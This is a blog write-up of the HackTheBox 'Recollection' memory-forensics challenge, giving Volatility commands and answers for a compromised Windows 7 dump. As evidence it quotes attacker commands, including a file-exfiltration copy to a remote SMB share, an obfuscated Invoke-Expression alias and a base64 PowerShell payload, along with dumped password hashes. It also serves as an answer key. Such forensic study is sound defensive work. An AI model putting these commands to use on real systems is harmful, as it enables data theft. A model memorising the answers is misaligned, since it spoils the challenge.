---
layout: post
author: Julio
date: 07-05-2024
title: Recollection Write-Up
---

<div class="center"><img src="https://labs.hackthebox.com/storage/challenges/605ff764c617d3cd28dbbdd72be8f9a2.png" width="350"></div>

# Recollection Write-Up

## Introduction

<p>Recollection is an "Easy" sherlock challenge on HackTheBox. This is the scenario: "A junior member of our security team has been performing research and testing on what we believe to be an old and insecure operating system. We believe it may have been compromised & have managed to retrieve a memory dump of the asset. We want to confirm what actions were carried out by the attacker and if any other assets in our environment might be affected. Please answer the questions below."</p>
<p>We start with a file called <custom-code>recollection.zip</custom-code> and we unzip it to get <custom-code>recollection.bin</custom-code></p>

## Questions

### 1. What is the Operating System of the machine?

<p>Judging by the scenario description, we are dealing with a memory dump. We can use a tool called "Volatility" to interact with it and retrieve information about what was going on at the moment of the dump.</p>
<p>Assuming the memory dump was taken from a Windows machine, we can run the following command to get more information on the system:</p>

```bash
python3 vol.py -f ../recollection.bin windows.info
Volatility 3 Framework 2.7.0
Progress:  100.00		PDB scanning finished
Variable	Value

Kernel Base	0xf8000285c000
DTB	0x187000
Symbols	file:///Users/julio/Downloads/Recollection/volatility3/volatility3/symbols/windows/ntkrnlmp.pdb/DADDB88936DE450292977378F364B110-1.json.xz
Is64Bit	True
IsPAE	False
layer_name	0 WindowsIntel32e
memory_layer	1 FileLayer
KdDebuggerDataBlock	0xf80002a3f120
NTBuildLab	7601.24214.amd64fre.win7sp1_ldr_
CSDVersion	1
KdVersionBlock	0xf80002a3f0e8
Major/Minor	15.7601
MachineType	34404
KeNumberProcessors	1
SystemTime	2022-12-19 16:07:30
NtSystemRoot	C:\Windows
NtProductType	NtProductWinNt
NtMajorVersion	6
NtMinorVersion	1
PE MajorOperatingSystemVersion	6
PE MinorOperatingSystemVersion	1
PE Machine	34404
PE TimeDateStamp	Thu Aug  2 02:18:10 2018
```

<p>We can see <custom-code>NTBuildLab	7601.24214.amd64fre.win7sp1_ldr_</custom-code>, which indicates that the right answer is <custom-code>Windows 7</custom-code>.</p>

### 2. When was the memory dump created?

<p>The previous command also answers this one. The dump time is the system time. The right answer is <custom-code>2022-12-19 16:07:30</custom-code>.</p>

### 3. After the attacker gained access to the machine, the attacker copied an obfuscated PowerShell command to the clipboard. What was the command?

<p>We can use Volatility 2 to retrieve the contents of the clipboard:</p>

```bash
./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone -f ../recollection.bin --profile=Win7SP1x64_23418 clipboard
Volatility Foundation Volatility Framework 2.6
Session    WindowStation Format                         Handle Object             Data
---------- ------------- ------------------ ------------------ ------------------ --------------------------------------------------
         1 WinSta0       CF_UNICODETEXT               0x6b010d 0xfffff900c1bef100 (gv '*MDR*').naMe[3,11,2]-joIN''
         1 WinSta0       CF_TEXT                  0x7400000000 ------------------
         1 WinSta0       CF_LOCALE                    0x7d02bd 0xfffff900c209a260
         1 WinSta0       0x0L                              0x0 ------------------
```

<p>The right answer is <custom-code>(gv '*MDR*').naMe[3,11,2]-joIN''</custom-code>.</p>

### 4. The attacker copied the obfuscated command to use it as an alias for a PowerShell cmdlet. What is the cmdlet name?

<p>We can run the following command to get more information on the console history:</p>

```bash
./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone -f ../recollection.bin --profile=Win7SP1x64_23418 consoles
Volatility Foundation Volatility Framework 2.6
**************************************************
[...snip]
PS C:\Users\user> (gv '*MDR*').naMe[3,11,2]-joIN''
iex
PS C:\Users\user>
```

<p><custom-code>iex</custom-code> corresponds to <custom-code>Invoke-Expression</custom-code>, which is the right answer.</p>

### 5. A CMD command was executed to attempt to exfiltrate a file. What is the full command line?

<p>The same command executed above will iive us the answer:</p>

```bash
./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone -f ../recollection.bin --profile=Win7SP1x64_23418 consoles
Volatility Foundation Volatility Framework 2.6
**************************************************
ConsoleProcess: conhost.exe Pid: 3524
Console: 0xff9d6200 CommandHistorySize: 50
HistoryBufferCount: 3 HistoryBufferMax: 4
OriginalTitle: %SystemRoot%\system32\cmd.exe
Title: C:\Windows\system32\cmd.exe - powershell
AttachedProcess: powershell.exe Pid: 3532 Handle: 0xdc
AttachedProcess: cmd.exe Pid: 4052 Handle: 0x60
----
CommandHistory: 0xc2c50 Application: powershell.exe Flags:
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x0
----
CommandHistory: 0xbef50 Application: powershell.exe Flags: Allocated, Reset
CommandCount: 6 LastAdded: 5 LastDisplayed: 5
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0xdc
Cmd #0 at 0xc71c0: type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt
Cmd #1 at 0xbf230: powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
Cmd #2 at 0x9d1a0: powershell.exe -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
```

<p>The right answer is <custom-code>type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt</custom-code>.</p>

### 6. Following the above command, now tell us if the file was exfiltrated successfully?

<p>The output of the above command will also tell us if the command was successful or not according to stdout.</p>

```bash
[...snip]
PS C:\Users\user> type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171
\pulice\pass.txt
The network path was not found.
[...snip]
```

<p>We can see that a network path was not found. Thus, the answer is <custom-code>NO</custom-code>.</p>

### 7. The attacker tried to create a readme file. What was the full path of the file?

The output of the same command gives us the answer to this question:

```bash
[...snip]
Cmd #3 at 0x1be6e0: powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
[...snip]
```

<p>We can see that an obfuscated command was run. As it is a base64-encoded text, we can easily decode it:</p>

```bash
echo "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi" | base64 -d
echo "hacked by mafia" > "C:\Users\Public\Office\readme.txt"
```

<p>The right answer is <custom-code>C:\Users\Public\Office\readme.txt</custom-code>.</p>

### 8. What was the Host Name of the machine?

<p>First, we will dump the hives:</p>

```bash
./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone -f ../recollection.bin --profile=Win7SP1x64_23418 hivelist
Volatility Foundation Volatility Framework 2.6
Virtual            Physical           Name
------------------ ------------------ ----
0xfffff8a004266010 0x000000009a90f010 \Device\HarddiskVolume1\Boot\BCD
0xfffff8a004a41010 0x000000009df13010 \SystemRoot\System32\Config\DEFAULT
0xfffff8a004a57010 0x000000009ddb9010 \SystemRoot\System32\Config\SAM
0xfffff8a00000d190 0x00000000a9882190 [no name]
0xfffff8a000024010 0x00000000a96fa010 \REGISTRY\MACHINE\SYSTEM
0xfffff8a00004f010 0x00000000a9725010 \REGISTRY\MACHINE\HARDWARE
0xfffff8a0006d4010 0x0000000081300010 \SystemRoot\System32\Config\SECURITY
0xfffff8a000733010 0x00000000a1d49010 \SystemRoot\System32\Config\SOFTWARE
0xfffff8a000ca4010 0x000000009f5fb010 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT
0xfffff8a000d35010 0x00000000976ff010 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT
0xfffff8a00125b010 0x0000000083a0c010 \??\C:\Users\user\ntuser.dat
0xfffff8a0012e3010 0x000000007cb5d010 \??\C:\Users\user\AppData\Local\Microsoft\Windows\UsrClass.dat
0xfffff8a00257e010 0x0000000106fd2010 \??\C:\System Volume Information\Syscache.hve
```

<p>We are interesting in <custom-code>0xfffff8a000024010 0x00000000a96fa010 \REGISTRY\MACHINE\SYSTEM</custom-code>. Once we have the offset of the virtual address, we can run the following command to retrieve the hostname:</p>

```bash
./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone -f ../recollection.bin --profile=Win7SP1x64_23418 printkey -o 0xfffff8a000024010 -K 'ControlSet001\Control\ComputerName\ComputerName'
Volatility Foundation Volatility Framework 2.6
Legend: (S) = Stable   (V) = Volatile

----------------------------
Registry: \REGISTRY\MACHINE\SYSTEM
Key name: ComputerName (S)
Last updated: 2022-12-10 23:48:28 UTC+0000

Subkeys:

Values:
REG_SZ                        : (S) mnmsrvc
REG_SZ        ComputerName    : (S) USER-PC
```

<p>The right answer is <custom-code>USER-PC</custom-code>.</p>

### 9. How many user accounts were in the machine?

<p>We can run a hashdump command to retrieve hashes of all the users in the machine.</p>

```bash
./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone -f ../recollection.bin --profile=Win7SP1x64_23418 hashdump
Volatility Foundation Volatility Framework 2.6
Administrator:500:aad3b435b51404eeaad3b435b51404ee:10eca58175d4228ece151e287086e824:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
user:1001:aad3b435b51404eeaad3b435b51404ee:5915a7959c04d8560468296edaefbc9b:::
HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:cb6003ecf6b98b5f7fbbb03df798ac76:::
```

<p>Since the question asks about user accounts, I will not be considering the Guest account. Thus, the right answer is <custom-code>3</custom-code>.</p>

### 10. In the "\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge" folder there were some sub-folders where there was a file named passwords.txt. What was the full file location/path?

<p>We can run the following command to scan for files and grep for the one we want:</p>

```bash
./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone -f ../recollection.bin --profile=Win7SP1x64_23418 filescan | grep passwords.txt
Volatility Foundation Volatility Framework 2.6
0x000000011fc10070      1      0 R--rw- \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt
```

<p>The right answer is <custom-code>\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt</custom-code>.</p>

### 11. A malicious executable file was executed using command. The executable EXE file's name was the hash value of itself. What was the hash value?

<p>We can use the same command to retrieve the contents of the console history and we will find the following in the output:</p>

```
Cmd #5 at 0xc2ee0: .\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
```

<p>The right answer is <custom-code>b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1</custom-code>.</p>

### 12. Following the previous question, what is the Imphash of the malicous file you found above?

<p>If we look up the name of the file on VirusTotal, we can find the following:</p>

```
Imphash d3b592cd9481e4f053b5362e22d61595
```

<p>The right answer is <custom-code>d3b592cd9481e4f053b5362e22d61595</custom-code>.</p>

### 13. Following the previous question, tell us the date in UTC format when the malicious file was created?

VirusTotal also has the answer for this one under the details tab. The right answer is <custom-code>2022-06-22 11:49:04</custom-code>.

### 14. What was the local IP address of the machine?

<p>We can check for all network connections with the following command:</p>

```bash
./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone -f ../recollection.bin --profile=Win7SP1x64_23418 netscan
Volatility Foundation Volatility Framework 2.6
Offset(P)          Proto    Local Address                  Foreign Address      State            Pid      Owner          Created
[...snip]
0x11f8395c0        TCPv4    192.168.0.104:49323            199.232.46.132:443   ESTABLISHED      -1
0x11fbd4570        TCPv4    192.168.0.104:49340            23.47.190.91:443     ESTABLISHED      -1
0x11fbe1010        TCPv4    192.168.0.104:49326            198.144.120.23:80    CLOSED           -1
0x11fd21cd0        TCPv4    192.168.0.104:49341            198.144.120.23:443   CLOSE_WAIT       -1
0x11fd4b010        TCPv4    192.168.0.104:49325            198.144.120.23:80    CLOSED           -1
```

<p>We can see that the local ip and right answer is <custom-code>192.168.0.104</custom-code>.</p>

### 15. There were multiple PowerShell processes, where one process was a child process. Which process was its parent process?

<p>We can run the following command to retrieve the process tree:</p>

```bash
./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone -f ../recollection.bin --profile=Win7SP1x64_23418 pstree
Volatility Foundation Volatility Framework 2.6
Name                                                  Pid   PPid   Thds   Hnds Time
-------------------------------------------------- ------ ------ ------ ------ ----
 0xfffffa8005967060:explorer.exe                     2032   1988     23    906 2022-12-19 15:33:13 UTC+0000
. 0xfffffa8003de2750:notepad.exe                     3476   2032      1     62 2022-12-19 15:50:42 UTC+0000
[...snip]
. 0xfffffa8003cbc060:cmd.exe                         4052   2032      1     23 2022-12-19 15:40:08 UTC+0000
.. 0xfffffa8005abbb00:powershell.exe                 3532   4052      5    606 2022-12-19 15:44:44 UTC+0000
```

<p>As seen above, the parent process and right answer is <custom-code>cmd.exe</custom-code>.</p>

### 16. Attacker might have used an email address to login a social media. Can you tell us the email address?

We can use the Yara plugin to look for specific strings inside processes. We can run it and look for "gmail.com" or other famous .

```bash
./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone -f ../recollection.bin --profile=Win7SP1x64_23418 yarascan -Y "gmail.com"
Volatility Foundation Volatility Framework 2.6
Rule: r1
Owner: Process msedge.exe Pid 2380
0x070d37d7  67 6d 61 69 6c 2e 63 6f 6d 6d 61 66 69 61 5f 63   gmail.commafia_c
0x070d37e7  6f 64 65 31 33 33 37 40 67 6d 61 69 6c 2e 63 6f   ode1337@gmail.co
0x070d37f7  6d 63 a0 8b 5a 63 a0 8b 5a 0a 00 00 00 01 07 de   mc..Zc..Z.......
0x070d3807  00 07 de 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
[...snip]
```

<p>The right answer is <custom-code>mafia_code1337@gmail.com</custom-code>.</p>

### 17. Using MS Edge browser, the victim searched about a SIEM solution. What is the SIEM solution's name?

<p>Since the victim used MS Edge to search for a SIEM solution, we can try to find its history with the following command:</p>

```bash
./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone -f ../recollection.bin --profile=Win7SP1x64_23418 filescan | grep -i History
Volatility Foundation Volatility Framework 2.6
[...snip]
0x000000011e0d16f0     17      1 RW-rw- \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\Default\History
[...snip]
```

<p>Once we have the offset, we can dump the file from memory:</p>

```bash
./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone -f ../recollection.bin --profile=Win7SP1x64_23418 dumpfiles --dump-dir . -Q 0x000000011e0d16f0
Volatility Foundation Volatility Framework 2.6
DataSectionObject 0x11e0d16f0   None   \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\Default\History
SharedCacheMap 0x11e0d16f0   None   \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\Default\History
```

<p>It will then generate a SQLite3 file that we can interact with and retrieve the searches:</p>

```bash
file file.None.0xfffffa80056d1440.dat
file.None.0xfffffa80056d1440.dat: SQLite 3.x database, last written using SQLite version 3039004, file counter 5, database pages 40, cookie 0x1f, schema 4, UTF-8, version-valid-for 5

sqlite3 file.None.0xfffffa80056d1440.dat
SQLite version 3.43.2 2023-10-10 13:08:14
Enter ".help" for usage hints.

sqlite> .tables
cluster_keywords          downloads                 segment_usage
cluster_visit_duplicates  downloads_reroute_info    segments
clusters                  downloads_slices          typed_url_sync_metadata
clusters_and_visits       downloads_url_chains      urls
content_annotations       keyword_search_terms      visit_source
context_annotations       meta                      visits

sqlite> select * from keyword_search_terms;
2|5|install wazuh agent windows|install wazuh agent windows
2|12|malwarebazaar|malwarebazaar
2|21|malwarebazaar|malwarebazaar
2|23|7 zip windows 10|7 zip windows 10
2|24|7 zip windows 7|7 zip windows 7
2|27|base64 encode|base64 encode
sqlite>
```

<p>The right answer is <custom-code>Wazuh</custom-code>.</p>

### 18. The victim user downloaded an exe file. The file's name was mimicking a legitimate binary from Microsoft with a typo (i.e. legitimate binary is powershell.exe and attacker named a malware as powershall.exe). Tell us the file name with the file extension?

<p>We can use the following command to look for files in the Downloads directory:</p>

```bash
./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone -f ../recollection.bin --profile=Win7SP1x64_23418 filescan | grep -i Downloads
Volatility Foundation Volatility Framework 2.6
0x000000011dff8aa0      2      1 R--rwd \Device\HarddiskVolume2\Users\user\Downloads
0x000000011e0ee070     16      0 R--rw- \Device\HarddiskVolume2\Users\user\Links\Downloads.lnk
0x000000011e580e40     15      0 R--rwd \Device\HarddiskVolume2\Users\user\Downloads\desktop.ini
0x000000011e7d1aa0      2      1 R--rwd \Device\HarddiskVolume2\Users\user\Downloads
0x000000011e955820     16      0 -W-r-- \Device\HarddiskVolume2\Users\user\Downloads\csrsss.exe9541153d0e2cd21bdae11591f6be48407f896b75e1320628346b03.exe
0x000000011ee95460     12      0 R--rw- \Device\HarddiskVolume2\Users\user\Downloads\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.zip
0x000000011fa45c20     16      0 -W-r-- \Device\HarddiskVolume2\Users\user\Downloads\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
0x000000011fc1db70      2      0 R--r-d \Device\HarddiskVolume2\Users\user\Downloads\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
0x000000011fd79a90     16      0 RW-rwd \Device\HarddiskVolume2\Users\user\Downloads\7z2201-x64.exe
0x000000011fdbd560     16      0 R--rwd \Device\HarddiskVolume2\Users\Public\Downloads\desktop.ini
0x000000011fdeb470     10      0 R--r-d \Device\HarddiskVolume2\Users\user\Downloads\csrsss.exe9541153d0e2cd21bdae11591f6be48407f896b75e1320628346b03.exe
0x000000011fe5b070     15      0 R--r-- \Device\HarddiskVolume2\Users\user\Downloads\bf9e9366489541153d0e2cd21bdae11591f6be48407f896b75e1320628346b03.zip
```

<p>The file <custom-code>csrsss.exe</custom-code> is suspicious since it appears to have an extra "s". This is the right answer.</p>

## Conclusion

<p>Great challenge for those who want to get more into memory analysis. It made me go deeper into the plugins and commands of Volatility and it helped me understnad how memory analysis can be performed with it. Really cool stuff.</p>

## References

- <a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/memory-dump-analysis/volatility-cheatsheet">https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/memory-dump-analysis/volatility-cheatsheet</a>
- <a href="https://github.com/volatilityfoundation/volatility/wiki/Command-Reference">https://github.com/volatilityfoundation/volatility/wiki/Command-Reference</a>
